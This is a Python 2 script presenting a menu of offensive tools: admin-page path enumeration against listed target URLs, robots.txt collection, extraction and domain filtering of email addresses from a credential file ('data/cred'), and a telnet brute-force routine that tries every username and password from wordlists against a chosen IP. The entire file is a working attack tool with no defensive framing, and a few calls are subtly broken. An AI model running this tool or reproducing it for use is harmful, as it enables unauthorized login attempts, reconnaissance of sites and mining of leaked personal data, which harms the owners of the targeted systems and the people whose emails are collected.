import requests
import telnetlib
import time
import sys
import re

end = "\033[0m"
bold = "\033[1m"
red = "\033[31m"
green = "\033[32m"

def print_result(result):
    print("-"*30)
    print(result)
    print("-"*30)

def menu():
    menu = '''1. admin page find tools
2. robots find tools
3. create email file tools
4. find specific email in email file
5. Telnet Brute Force Attack
0. exit'''
    print_result(menu)
    
    return input(">> ")


def argu_check():
    f = open("data/target_url","r")
    tmp1 = f.read().split("\n")
    tmp1.pop()
    argu = []
    if(len(tmp1)==0):
        print("Program needs arguments")
        print("Please read data/README.md")
        exit(0)
    for c in tmp1:
        tmp2 = c.split()
        if(len(tmp2)<2):
            print("Example\nhttp://example.com 80\nhttps://example.com 443 jsp")
            exit(0)
        argu.append(c.split()) # two dimensional array
    return argu

def file_type_check(search_type): # File type check
    f = open('data/page_list', mode='r')
    tmp = f.read().split()
    argu_size = len(search_type) # include allow file type in arguments
    #file_type = ["htm","cfm","brf","cgi","js"]
    file_type = ["htm","js"]
    page = []
    if argu_size!=0:
        for i in range(0,len(tmp)):
            try:
                result = 0
                if(tmp[i][-1:]=="/"):
                    raise NotImplementedError
                for k in file_type:
                    if(tmp[i].find(k)!=-1):
                        if(k=="js" and tmp[i].find("jsp")!=-1):
                            continue
                        raise NotImplementedError
                for j in range(0,argu_size):
                    if(tmp[i].find(search_type[j])!=-1):
                        raise NotImplementedError
            except:
                page.append(tmp[i])
    if(len(page)==0):
        return tmp
    else:
        return page

def admin_check(url,port,page,path,error_text): # check admin page (url:port/page)
    
    result = ""
    if_val = 0 # 0 == false, 1 == true
    size = len(error_text)

    requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += 'HIGH:!DH:!aNULL' # Fix up dh too small error

    for i in range(len(page)):
        try:
            temp = url+":"+port+"/"+path+page[i]
            print(temp)
            response = requests.get(temp, timeout=10) # 10 sec after timeout exception
            response.encoding = None # fix up breaking hangul
            text = response.text
            if(text.find("404")!=-1):
                if_val = 0
            elif(size!=0):
                for error in error_text:
                    if(text.find(error)!=-1):
                        if_val = 0
                        break
                    else:
                        if_val = 1
            else:
                if_val = 1

            if(if_val!=0):
                result += "\n"+temp+"\n"
                result += text+"\n"
                print("\n"+bold+green+"[+]"+end+" "+temp)
                print(text+"\n")
            else:
                print("\n"+bold+red+"[-]"+end+" "+temp)
                print("Not Found\n")
                
        except Exception as ex:
            print("\n"+bold+red+"[-]"+end+" "+temp)
            print("Error\n")
            print(ex)
    print_result(result)
    return result

def robots():
    f = open("data/url_list","r")
    url = f.read().split()
    result =""
    for i in range(len(url)):
        temp = url[i]+"/robots.txt"
        result += temp+"\n"
        try:
            response = requests.get(temp)
            text = response.text
            result += text+"\n\n"
        except:
            result += "Not Found"+"\n"
    print_result(result)
    return result

def save(url,port,path,result,mode=""): # change arguments
    if(path!=""): path = "/"+path
    file_name = url+":"+port+path
    if(mode=="admin"):
        f = open("data/checked_url.txt","a")
        f.write(file_name+"\n")
        f.close()
        if(result==""):
            print(bold+red+"[-] "+end+"The tool didn`t find Vuln ant don`t save\n\n")
            return 1
    file_name = file_name.replace(":","")
    file_name = file_name.replace("/","_")
    print("Save result, File Path : ./result/"+file_name+"\n\n")
    f = open("result/"+file_name,"a")
    f.write(result.encode('utf-8')) # fix up breaking hangul
    f.close()

def create_email_file():
    pattern = re.compile("[a-z0-9]*@[^-]*")
    cred = open("data/cred","r")
    email = open("data/email","w")

    save_email(cred,email,pattern)

    print("Regular expression search complete")
    cred.close()    
    email.close()
    

def find_email():
    string = raw_input("Enter the domain you want to search for in email file >> ") # python 2.7
    pattern = re.compile(".*@.*"+string+".*")
    
    email = open("data/email","r")
    result = open("result/"+string,"w")
    
    save_email(email,result,pattern)

    print("Regular expression search complete")
    email.close()
    result.close()

def save_email(tmp1, tmp2,pattern):
    while(1):
        buf=tmp1.read(500000)
        if buf:
            result = pattern.findall(buf)
            for c in result:
                tmp2.write(c+"\n")
        else:
            break

def telnet_connect(host,user,password):
    tn = telnetlib.Telnet(host)
    tn.read_until("Username:")
    tn.write(user+"\n")
    tn.read_until("Password")
    tn.write(password+"\n")
    tn.read_some()

    result = "ID : "+user+", Password : "+password
    result += tn.read_some()+"\n\n"
    tn.close()

    return result

def check_url(url,port,path):
    f = open("data/checked_url.txt","r")
    url_list = f.read()
    if(path!=""): path = "/"+path
    url = url+":"+port+path
    print("\n\n"+bold+url+end)
    pattern = re.compile(url+"[\s]")
    if(pattern.findall(url_list)):
        print(bold+red+"[-] "+end+"This url Checked admin pages\n\n")
        return 0
    else:
        return 1

def target_pop(target):
    url = target.pop(0)
    port = target.pop(0)
    file_type = target
    return url,port,file_type

num = menu()
if num==1:
    target_list = argu_check()
    for target in target_list:
        url,port,search_type = target_pop(target)
        print(url+":"+port)
        path= raw_input("Please enter the path that append when the program find admin page.( Ex : homepage/ )\nIf you don`t want to use this function, Press the Enter : ")
        if(check_url(url,port,path)):
            error_text=[]
            while(1):
                tmp= raw_input("\nPleas enter the text that appeares when the program can`t find admin page.\nIf you want to use the default value, Press the Enter (default=404) : ")
                if(tmp==""): break
                error_text.append(tmp)
            page = file_type_check(search_type)
            result = admin_check(url,port,page,path,error_text)
            save(url,port,path,result,"admin")
elif num==2:
    result = robots()
    save("robots.txt",result)
elif num==3:
    create_email_file()
elif num==4:
    find_email()
elif num==5:
    host = raw_input("telnet IP : ")
    u = open("data/user","r")
    p = open("data/Attack password","r")
    result =""
    user_list = u.read().split()
    password_list = p.read().split()
    for user in user_list:
        for password in password_list:
            tmp  = telnet_connect(host,user,password)
            print(tmp)
            result += tmp
    print(result)
    save(host,"23","",result)
    u.close()
    p.close()
elif num==0:
    exit(0)
